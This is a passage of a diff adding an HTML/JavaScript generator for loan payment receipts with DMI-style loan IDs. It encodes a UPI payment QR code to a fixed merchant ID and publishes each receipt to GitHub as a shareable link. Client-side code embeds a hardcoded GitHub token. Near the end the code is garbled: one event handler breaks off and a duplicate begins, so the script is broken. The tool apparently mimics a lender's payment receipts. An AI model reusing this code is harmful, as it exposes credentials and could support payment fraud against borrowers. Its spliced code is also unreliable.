+      amount: '<svg width="21" height="21" viewBox="0 0 24 24" fill="#000000"><circle cx="12" cy="12" r="10" fill="#000000"/><path d="M9 7h6v1.5h-2.2c.4.4.7.9.8 1.5H15v1.5h-1.4c-.2 1.4-1.3 2.4-2.8 2.5l3.2 3.5h-2.1l-3-3.4V12.5h1.5c.9 0 1.6-.4 1.8-1H9V10h3.1c-.2-.6-.9-1-1.8-1H9V7z" fill="#FFFFFF"/></svg>',
+      manager: '<svg width="20" height="20" viewBox="0 0 24 24" fill="#000000"><rect x="3" y="3" width="18" height="18" rx="5" fill="#000000"/><path d="M9.5 15.5L6.5 12.5l1.4-1.4 1.6 1.6 4.6-4.6 1.4 1.4-6 6z" fill="#FFFFFF"/></svg>'
+    };
+
+    function applyIconFallbacks() {
+      document.querySelectorAll('.receipt-icon-img').forEach((imgEl) => {
+        const fallbackKey = imgEl.getAttribute('data-fallback');
+        imgEl.onerror = () => {
+          const parent = imgEl.parentElement;
+          if (parent && fallbackKey && FALLBACK_SVGS[fallbackKey]) {
+            parent.innerHTML = FALLBACK_SVGS[fallbackKey];
+          }
+        };
+      });
+    }
+
+    function isMobileDevice() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera || '';
+      const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+      const coarsePointer = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;
+      const narrowViewport = window.innerWidth <= 768;
+      return mobileRegex.test(ua) || (coarsePointer && narrowViewport);
+    }
+
+    function buildUpiIntentUri() {
+      return (
+        'upi://pay?pa=' +
+        encodeURIComponent(MERCHANT_UPI_ID) +
+        '&pn=' +
+        encodeURIComponent(MERCHANT_PAYEE_NAME) +
+        '&am=' +
+        encodeURIComponent(FIXED_UPI_AMOUNT) +
+        '&cu=INR&tn=' +
+        encodeURIComponent(MERCHANT_TRANSACTION_NOTE)
+      );
+    }
+
+    const QR_GF_EXP = new Uint8Array(512);
+    const QR_GF_LOG = new Uint8Array(256);
+    (() => {
+      let x = 1;
+      for (let i = 0; i < 255; i++) {
+        QR_GF_EXP[i] = x;
+        QR_GF_LOG[x] = i;
+        x <<= 1;
+        if (x & 0x100) x ^= 0x11d;
+      }
+      for (let i = 255; i < 512; i++) {
+        QR_GF_EXP[i] = QR_GF_EXP[i - 255];
+      }
+    })();
+
+    function qrGfMul(a, b) {
+      if (a === 0 || b === 0) return 0;
+      return QR_GF_EXP[(QR_GF_LOG[a] + QR_GF_LOG[b]) % 255];
+    }
+
+    function qrPolyMul(p, q) {
+      const res = new Uint8Array(p.length + q.length - 1);
+      for (let i = 0; i < p.length; i++) {
+        for (let j = 0; j < q.length; j++) {
+          res[i + j] ^= qrGfMul(p[i], q[j]);
+        }
+      }
+      return res;
+    }
+
+    function qrGeneratorPoly(ecLen) {
+      let poly = new Uint8Array([1]);
+      for (let i = 0; i < ecLen; i++) {
+        poly = qrPolyMul(poly, new Uint8Array([1, QR_GF_EXP[i]]));
+      }
+      return poly;
+    }
+
+    function qrCalcEc(data, ecLen) {
+      const gen = qrGeneratorPoly(ecLen);
+      const buf = new Uint8Array(data.length + ecLen);
+      buf.set(data);
+      for (let i = 0; i < data.length; i++) {
+        const factor = buf[i];
+        if (factor !== 0) {
+          for (let j = 0; j < gen.length; j++) {
+            buf[i + j] ^= qrGfMul(gen[j], factor);
+          }
+        }
+      }
+      return buf.slice(data.length);
+    }
+
+    function generateQrCodeSvg(text) {
+      const encoder = new TextEncoder();
+      const rawBytes = encoder.encode(String(text || ''));
+      const versions = [
+        [1, 21, 16, 10, 1],
+        [2, 25, 28, 16, 1],
+        [3, 29, 44, 26, 1],
+        [4, 33, 64, 18, 2],
+        [5, 37, 86, 24, 2],
+        [6, 41, 108, 16, 4],
+        [7, 45, 124, 18, 4],
+        [8, 49, 154, 22, 4],
+        [9, 53, 182, 22, 5],
+        [10, 57, 216, 26, 5]
+      ];
+
+      let chosen = versions[versions.length - 1];
+      for (const v of versions) {
+        const capacityBytes = v[2] - (v[0] < 10 ? 2 : 3);
+        if (rawBytes.length <= capacityBytes) {
+          chosen = v;
+          break;
+        }
+      }
+
+      const [ver, size, totalDataCw, ecCwPerBlock, numBlocks] = chosen;
+      const bits = [];
+      const pushBits = (val, len) => {
+        for (let i = len - 1; i >= 0; i--) {
+          bits.push((val >> i) & 1);
+        }
+      };
+
+      pushBits(0b0100, 4);
+      pushBits(rawBytes.length, ver < 10 ? 8 : 16);
+      for (const b of rawBytes) pushBits(b, 8);
+
+      const maxDataBits = totalDataCw * 8;
+      const terminatorLen = Math.min(4, maxDataBits - bits.length);
+      if (terminatorLen > 0) pushBits(0, terminatorLen);
+      while (bits.length % 8 !== 0) bits.push(0);
+
+      const dataCodewords = new Uint8Array(totalDataCw);
+      let cwIdx = 0;
+      for (let i = 0; i < bits.length && cwIdx < totalDataCw; i += 8) {
+        let byteVal = 0;
+        for (let b = 0; b < 8; b++) {
+          byteVal = (byteVal << 1) | (bits[i + b] || 0);
+        }
+        dataCodewords[cwIdx++] = byteVal;
+      }
+
+      const padBytes = [0xec, 0x11];
+      let padIdx = 0;
+      while (cwIdx < totalDataCw) {
+        dataCodewords[cwIdx++] = padBytes[padIdx % 2];
+        padIdx++;
+      }
+
+      const shortBlockLen = Math.floor(totalDataCw / numBlocks);
+      const longBlocksCount = totalDataCw % numBlocks;
+      const dataBlocks = [];
+      const ecBlocks = [];
+      let offset = 0;
+
+      for (let b = 0; b < numBlocks; b++) {
+        const len = shortBlockLen + (b >= numBlocks - longBlocksCount ? 1 : 0);
+        const block = dataCodewords.slice(offset, offset + len);
+        offset += len;
+        dataBlocks.push(block);
+        ecBlocks.push(qrCalcEc(block, ecCwPerBlock));
+      }
+
+      const interleaved = [];
+      const maxBlockLen = shortBlockLen + (longBlocksCount > 0 ? 1 : 0);
+      for (let i = 0; i < maxBlockLen; i++) {
+        for (let b = 0; b < numBlocks; b++) {
+          if (i < dataBlocks[b].length) interleaved.push(dataBlocks[b][i]);
+        }
+      }
+      for (let i = 0; i < ecCwPerBlock; i++) {
+        for (let b = 0; b < numBlocks; b++) {
+          interleaved.push(ecBlocks[b][i]);
+        }
+      }
+
+      const finalBits = [];
+      for (const cw of interleaved) {
+        for (let bit = 7; bit >= 0; bit--) {
+          finalBits.push((cw >> bit) & 1);
+        }
+      }
+
+      const matrix = Array.from({ length: size }, () => new Int8Array(size).fill(-1));
+      const reserved = Array.from({ length: size }, () => new Uint8Array(size).fill(0));
+
+      const setModule = (r, c, val, isReserved = true) => {
+        if (r >= 0 && r < size && c >= 0 && c < size) {
+          matrix[r][c] = val ? 1 : 0;
+          if (isReserved) reserved[r][c] = 1;
+        }
+      };
+
+      const drawFinder = (topR, leftC) => {
+        for (let r = -1; r <= 7; r++) {
+          for (let c = -1; c <= 7; c++) {
+            const rr = topR + r;
+            const cc = leftC + c;
+            if (rr < 0 || rr >= size || cc < 0 || cc >= size) continue;
+            const inBorder = r === 0 || r === 6 || c === 0 || c === 6;
+            const inCenter = r >= 2 && r <= 4 && c >= 2 && c <= 4;
+            const isDark = r >= 0 && r <= 6 && c >= 0 && c <= 6 && (inBorder || inCenter);
+            setModule(rr, cc, isDark ? 1 : 0, true);
+          }
+        }
+      };
+
+      drawFinder(0, 0);
+      drawFinder(0, size - 7);
+      drawFinder(size - 7, 0);
+
+      const alignCentersByVer = {
+        2: [6, 18],
+        3: [6, 22],
+        4: [6, 26],
+        5: [6, 30],
+        6: [6, 34],
+        7: [6, 22, 38],
+        8: [6, 24, 42],
+        9: [6, 26, 46],
+        10: [6, 28, 50]
+      };
+      const centers = alignCentersByVer[ver] || [];
+      for (const rCenter of centers) {
+        for (const cCenter of centers) {
+          if (reserved[rCenter][cCenter]) continue;
+          for (let dr = -2; dr <= 2; dr++) {
+            for (let dc = -2; dc <= 2; dc++) {
+              const dark = Math.abs(dr) === 2 || Math.abs(dc) === 2 || (dr === 0 && dc === 0);
+              setModule(rCenter + dr, cCenter + dc, dark ? 1 : 0, true);
+            }
+          }
+        }
+      }
+
+      for (let i = 8; i < size - 8; i++) {
+        const bitVal = i % 2 === 0 ? 1 : 0;
+        if (!reserved[6][i]) setModule(6, i, bitVal, true);
+        if (!reserved[i][6]) setModule(i, 6, bitVal, true);
+      }
+
+      setModule(size - 8, 8, 1, true);
+
+      for (let i = 0; i < 8; i++) {
+        if (i < size) {
+          reserved[8][i] = 1;
+          reserved[i][8] = 1;
+        }
+        if (size - 1 - i >= 0) {
+          reserved[8][size - 1 - i] = 1;
+          reserved[size - 1 - i][8] = 1;
+        }
+      }
+
+      let bitIdx = 0;
+      let upward = true;
+      for (let col = size - 1; col > 0; col -= 2) {
+        if (col === 6) col = 5;
+        for (let step = 0; step < size; step++) {
+          const r = upward ? size - 1 - step : step;
+          for (const c of [col, col - 1]) {
+            if (!reserved[r][c]) {
+              const val = bitIdx < finalBits.length ? finalBits[bitIdx++] : 0;
+              matrix[r][c] = val;
+            }
+          }
+        }
+        upward = !upward;
+      }
+
+      for (let r = 0; r < size; r++) {
+        for (let c = 0; c < size; c++) {
+          if (!reserved[r][c] && (r + c) % 2 === 0) {
+            matrix[r][c] ^= 1;
+          }
+        }
+      }
+
+      const formatBits = 0x5412;
+      const getFmtBit = (idx) => (formatBits >> (14 - idx)) & 1;
+
+      const darkCoordsA = [
+        [8, 0], [8, 1], [8, 2], [8, 3], [8, 4], [8, 5], [8, 7], [8, 8],
+        [7, 8], [5, 8], [4, 8], [3, 8], [2, 8], [1, 8], [0, 8]
+      ];
+      darkCoordsA.forEach(([r, c], idx) => {
+        matrix[r][c] = getFmtBit(idx);
+      });
+
+      const darkCoordsB = [
+        [size - 1, 8], [size - 2, 8], [size - 3, 8], [size - 4, 8],
+        [size - 5, 8], [size - 6, 8], [size - 7, 8],
+        [8, size - 8], [8, size - 7], [8, size - 6], [8, size - 5],
+        [8, size - 4], [8, size - 3], [8, size - 2], [8, size - 1]
+      ];
+      darkCoordsB.forEach(([r, c], idx) => {
+        matrix[r][c] = getFmtBit(idx);
+      });
+
+      const quietZone = 2;
+      const totalModules = size + quietZone * 2;
+      let rects = '';
+      for (let r = 0; r < size; r++) {
+        for (let c = 0; c < size; c++) {
+          if (matrix[r][c] === 1) {
+            rects += '<rect x="' + (c + quietZone) + '" y="' + (r + quietZone) + '" width="1" height="1"/>';
+          }
+        }
+      }
+
+      return (
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ' +
+        totalModules +
+        ' ' +
+        totalModules +
+        '" shape-rendering="crispEdges">' +
+        '<rect width="' +
+        totalModules +
+        '" height="' +
+        totalModules +
+        '" fill="#FFFFFF"/>' +
+        '<g fill="#0F172A">' +
+        rects +
+        '</g></svg>'
+      );
+    }
+
+    function openPaymentModal() {
+      const upiUri = buildUpiIntentUri();
+      const overlay = document.getElementById('paymentModal');
+
+      if (isMobileDevice()) {
+        if (overlay) overlay.classList.remove('active');
+        try {
+          window.location.href = upiUri;
+        } catch (err) {
+          // Ignore if blocked
+        }
+        return;
+      }
+
+      const qrContainer = document.getElementById('qrCodeContainer');
+      if (qrContainer) {
+        qrContainer.innerHTML = generateQrCodeSvg(upiUri);
+      }
+      if (overlay) overlay.classList.add('active');
+    }
+
+    function closePaymentModal(event) {
+      const overlay = document.getElementById('paymentModal');
+      if (!event || event.target === overlay) {
+        overlay.classList.remove('active');
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      applyIconFallbacks();
+    });
+  </script>
+</body>
+</html>`;
+    }
+
+    /**
+     * Encode UTF-8 string cleanly into Base64 for GitHub Contents API
+     */
+    function toBase64Utf8(str) {
+      const bytes = new TextEncoder().encode(str);
+      let binary = '';
+      for (let i = 0; i < bytes.length; i++) {
+        binary += String.fromCharCode(bytes[i]);
+      }
+      return btoa(binary);
+    }
+
+    /**
+     * Push or update loan/<firstname>.html in GitHub repository via Contents API
+     */
+    async function pushReceiptToGitHub({ fileNameSlug, htmlContent, token, commitMessage }) {
+      const repoPath = `${TARGET_FOLDER}/${fileNameSlug}.html`;
+      const apiUrl = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${repoPath}`;
+      const headers = {
+        Authorization: `Bearer ${token}`,
+        Accept: 'application/vnd.github+json',
+        'Content-Type': 'application/json'
+      };
+
+      let existingSha = null;
+      const getResp = await fetch(apiUrl, { method: 'GET', headers });
+      if (getResp.ok) {
+        const existingData = await getResp.json();
+        existingSha = existingData.sha || null;
+      } else if (getResp.status !== 404) {
+        const errBody = await getResp.json().catch(() => ({}));
+        throw new Error(errBody.message || `GitHub lookup failed (${getResp.status})`);
+      }
+
+      const payload = {
+        message: commitMessage,
+        content: toBase64Utf8(htmlContent),
+        ...(existingSha ? { sha: existingSha } : {})
+      };
+
+      const putResp = await fetch(apiUrl, {
+        method: 'PUT',
+        headers,
+        body: JSON.stringify(payload)
+      });
+
+      if (!putResp.ok) {
+        const errBody = await putResp.json().catch(() => ({}));
+        throw new Error(errBody.message || `Failed to save file on GitHub (${putResp.status})`);
+      }
+
+      return {
+        repoPath,
+        shareableUrl: `${LIVE_SITE_BASE}${repoPath}`
+      };
+    }
+
+    /**
+     * Update live file name preview when Account Holder Name changes
+     */
+    function updateFileNamePreview() {
+      const rawName = document.getElementById('holderName').value || 'Adnan Ibrahim';
+      const slug = getFirstNameSlug(rawName.toUpperCase());
+      const previewEl = document.getElementById('fileNamePreview');
+      if (previewEl) {
+        previewEl.textContent = `${TARGET_FOLDER}/${slug}.html`;
+      }
+    }
+
+    // Initialize saved token and event listeners
+    window.addEventListener('DOMContentLoaded', () => {
+      const tokenInput = document.getElementById('ghToken');
+      const rememberCheckbox = document.getElementById('rememberToken');
+
+      try {
+        const savedToken = localStorage.getItem(TOKEN_STORAGE_KEY) || FIXED_GITHUB_TOKEN;
+        if (tokenInput) {
+          tokenInput.value = savedToken;
+        }
+      } catch (e) {
+        if (tokenInput) {
+          tokenInput.value = FIXED_GITHUB_TOKEN;
+        }
+      }
+
+      document.getElementById('holderName').addEventListener('input', updateFileNamePreview);
+
+      document.getElementById('useTodayBtn').addEventListener('click', () => {
+        document.getElementById('billDate').value = getTodayFormattedDate();
+        hideStatus();
+      });
+
+      document.getElementById('clearTokenBtn').addEventListener('click', () => {
+    // Initialize event listeners
+    window.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('holderName').addEventListener('input', updateFileNamePreview);
+
+      document.getElementById('useTodayBtn').addEventListener('click', () => {
+        document.getElementById('billDate').value = getTodayFormattedDate();
+        hideStatus();
+      });
+
+      document.getElementById('copyLinkBtn').addEventListener('click', () => {
+        const linkInput = document.getElementById('shareableLinkInput');
+        if (!linkInput || !linkInput.value) return;
+        try {
+          linkInput.select();
+          linkInput.setSelectionRange(0, linkInput.value.length);
+          document.execCommand('copy');
+          showStatus('Shareable receipt link copied to clipboard.', 'success');
+        } catch (e) {
+          showStatus('Unable to copy link automatically; please copy manually.', 'error');
+        }
+      });
+
+      document.getElementById('receiptForm').addEventListener('submit', async (event) => {
+        event.preventDefault();
+        hideStatus();
+
+        const rawHolder = document.getElementById('holderName').value.trim();
+        const rawLoan = document.getElementById('loanId').value.trim();
+        const rawStatus = document.getElementById('billStatus').value.trim().toUpperCase();
+        const rawDate = document.getElementById('billDate').value.trim();
+        const rawAmount = document.getElementById('billAmount').value.trim();
+        const token = FIXED_GITHUB_TOKEN;
+
+        if (!rawHolder) {
+          showStatus('Please enter Account Holder Name.', 'error');
+          return;
+        }
+
+        const normalizedLoan = normalizeLoanId(rawLoan);
+        if (!normalizedLoan) {
+          showStatus('Loan ID must start with DMI followed by 10 numeric digits (e.g. DMI0089202812).', 'error');
+          return;
+        }
+
+        if (!VALID_STATUSES.includes(rawStatus)) {
+          showStatus('Please select a valid Bill Status.', 'error');
+          return;
+        }
+
+        const normalizedDate = normalizeBillDate(rawDate);
+        if (!normalizedDate) {
+          showStatus('Invalid Bill Date. Use DD MMMM YYYY (e.g. 30 NOVEMBER 2026) or leave blank for today.', 'error');
+          return;
+        }
+
+        const parsedAmount = parseBillAmount(rawAmount);
+        if (!parsedAmount) {
+          showStatus('Please enter a valid positive Bill Amount.', 'error');
+          return;
+        }
+
+        if (!token) {
+          showStatus('Please enter your GitHub Personal Access Token to save the HTML file.', 'error');
+          return;
+        }
+
+        const holderUpper = rawHolder.toUpperCase();
+        const fileNameSlug = getFirstNameSlug(holderUpper);
+        const submitBtn = document.getElementById('generateBtn');
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Saving to GitHub...';
+
+        try {
+          const receiptHtml = buildReceiptHtml({
+            holderName: holderUpper,
+            loanId: normalizedLoan,
+            billStatus: rawStatus,
+            billDate: normalizedDate,
+            formattedAmount: parsedAmount.formattedDisplay,
+            numericAmount: parsedAmount.numericFixed
+          });
+
+          const result = await pushReceiptToGitHub({
+            fileNameSlug,
+            htmlContent: receiptHtml,
+            token,
+            commitMessage: `Add/update receipt for ${holderUpper} (${normalizedLoan})`
+          });
+
+          document.getElementById('resultCard').classList.remove('hidden');
+          document.getElementById('savedPathBadge').textContent = result.repoPath;
+          document.getElementById('shareableLinkInput').value = result.shareableUrl;
+          document.getElementById('openReceiptLink').href = result.shareableUrl;
+
+          showStatus(`Saved ${result.repoPath} to ${REPO_OWNER}/${REPO_NAME}.`, 'success');
+        } catch (err) {
+          showStatus(err.message || 'Error saving receipt to GitHub.', 'error');
+        } finally {
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Generate & Save HTML to GitHub';
+        }
+      });
+    });
+  </script>
+</body>
+</html>
+```
